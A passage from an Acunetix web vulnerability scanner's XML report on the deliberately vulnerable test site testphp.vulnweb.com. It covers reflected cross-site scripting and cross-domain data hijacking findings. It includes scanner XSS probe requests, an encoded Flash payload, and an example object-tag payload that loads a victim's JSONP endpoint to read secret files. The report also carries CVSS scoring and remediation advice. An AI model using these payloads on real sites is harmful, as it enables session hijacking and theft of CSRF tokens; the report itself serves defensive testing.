<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/params.php?p=valid'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;bfcg(9771)&lt;/ScRiPt&gt;&amp;pp=12 HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:30 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 46
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="20" color="orange">
       <Name><![CDATA[Cross domain data hijacking]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">p</font></b> was set to <b><font color="dark">CWS%07%0e000x%9c=%8d1N%c3%40%10E%df%ae%8d%bdI%08)%d3%40%1d%a0%a2%05%09%11%89HiP&quot;%05D%8bF%8e%0bG%26%1b%d9%8e%117%a0%a2%dc%82%8a%1br%04X;!S%8c%fe%cc%9b%f9%ff%aa%cb7Jq%af%7f%ed%f2.%f8%01&gt;%9e%18p%c9c%9al%8b%aczG%f2%dc%beM%ec%abdkj%1e%ac%2c%9f%a5(%b1%eb%89T%c2Jj)%93&quot;%dbT7%24%9c%8fH%cbD6)%a3%0bx)%ac%ad%d8%92%fb%1f%5c%07C%ac%7c%80Q%a7Nc%f4b%e8%fa%98%20b_%26%1c%9f5%20h%f1%d1g%0f%14%c1%0a]s%8d%8b0Q%a8L&lt;%9b6%d4L%bd_%a8w%7e%9d[%17%f3/[%dcm{%ef%cb%ef%e6%8d:n-%fb%b3%c3%dd.%e3d1d%ec%c7%3f6%cd0%09</font></b><br/>The value is reflected at the top of the page.]]></Details>
       <Affects><![CDATA[/hpp/params.php]]></Affects>
       <Parameter><![CDATA[p]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[An attacker can read any secrets (such as CSRF tokens) from the affected domain.]]></Impact>
       <Description><![CDATA[This page is possibly vulnerable to Cross domain data hijacking. If an attacker can create/upload a malicious Flash (SWF) file or control the top part of any page he can perform an attack known as <b>Cross domain data hijacking</b>. The Content-Type of the response doesn't matter. If the file is embedded using an &lt;object&gt; tag, it will be executed as a Flash file as long as the content of the file looks like a valid Flash file. 
<p> Here is the attack scenario:
<ul>
<li>An attacker creates a malicious Flash (SWF) file</li>
<li>The attacker changes the file extension to JPG</li>
<li>The attacker uploads the file to victim.com</li>
<li>The attacker embeds the file on attacker.com using an tag with type &quot;application/x-shockwave-flash&quot;</li>
<li>The victim visits attacker.com, loads the file as embedded with the tag</li>
<li>The attacker can now send and receive arbitrary requests to victim.com using the victims session</li>
<li>The attacker sends a request to victim.com and extracts the CSRF token from the response</li>
</ul>
</p>

<p>
There are many ways to perform this attack. The attacker doesn't need to upload a file. The only requirement is that an attacker can control the data on a location of the target domain. One way is to abuse a JSONP API. Usually, the attacker can control the output of a JSONP API endpoint by changing the callback parameter. However, if an attacker uses an entire Flash file as callback, we can use it just like we would use an uploaded file in this attack. </p>

A payload could look like this:
<pre wrap="virtual">
&lt;object style=&quot;height:1px;width:1px;&quot; data=&quot;http://victim.com/user/jsonp?callback=CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6%CD0%09&quot; type=&quot;application/x-shockwave-flash&quot; allowscriptaccess=&quot;always&quot; flashvars=&quot;c=alert&amp;u=http://victim.com/secret_file.txt&quot;&gt;&lt;/object&gt;
</pre>]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[For file uploads: It is recommended to check the file's content to have the correct header and format. If possible, use &quot;Content-Disposition: attachment; filename=Filename.Extension;&quot; header for the files that do not need to be served in the web browser. Isolating the domain of the uploaded files is also a good solution as long as the crossdomain.xml file of the main website does not include the isolated domain. <br/><br/>

For other cases: For JSONP abuses or other cases when the attacker control the top part of the page, you need to perform proper input filtering to protect against this type of issues.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/params.php?p=CWS%07%0e000x%9c=%8d1N%c3%40%10E%df%ae%8d%bdI%08)%d3%40%1d%a0%a2%05%09%11%89HiP&quot;%05D%8bF%8e%0bG%26%1b%d9%8e%117%a0%a2%dc%82%8a%1br%04X;!S%8c%fe%cc%9b%f9%ff%aa%cb7Jq%af%7f%ed%f2.%f8%01&gt;%9e%18p%c9c%9al%8b%aczG%f2%dc%beM%ec%abdkj%1e%ac%2c%9f%a5(%b1%eb%89T%c2Jj)%93&quot;%dbT7%24%9c%8fH%cbD6)%a3%0bx)%ac%ad%d8%92%fb%1f%5c%07C%ac%7c%80Q%a7Nc%f4b%e8%fa%98%20b_%26%1c%9f5%20h%f1%d1g%0f%14%c1%0a]s%8d%8b0Q%a8L&lt;%9b6%d4L%bd_%a8w%7e%9d[%17%f3/[%dcm{%ef%cb%ef%e6%8d:n-%fb%b3%c3%dd.%e3d1d%ec%c7%3f6%cd0%09&amp;pp=12 HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:32 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 223
]]></Response>
       </TechnicalDetails>
       <CWE id="20"><![CDATA[CWE-20]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[4.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Cross Domain Data Hijacking ]]></Database>
          <URL><![CDATA[https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The pitfalls of allowing file uploads on your website]]></Database>
          <URL><![CDATA[http://labs.detectify.com/post/86302927946/the-lesser-known-pitfalls-of-allowing-file-uploads]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="21" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">pp</font></b> was set to <b><font color="dark">12'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;bfcg(9160)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/hpp/params.php]]></Affects>
       <Parameter><![CDATA[pp]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/params.php?p=valid&amp;pp=12'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;bfcg(9160)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:50:32 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 46
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
